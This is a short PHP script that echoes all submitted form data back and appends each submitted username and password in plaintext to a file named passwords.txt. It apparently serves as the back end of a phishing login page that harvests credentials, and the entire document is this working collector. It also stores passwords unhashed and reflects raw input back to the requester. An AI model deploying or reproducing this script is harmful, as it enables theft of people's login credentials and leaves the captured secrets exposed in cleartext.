<?php
	print_r($_POST);

	 
	$myfile = fopen("passwords.txt", "a") or die("Unable to open file!");

	$msg = $_POST["username"];
	$msgg = $_POST["password"];
	fwrite($myfile, "username:".	$msg.	"\t". "password:". $msgg.	"\n");
	fclose($myfile);

?>
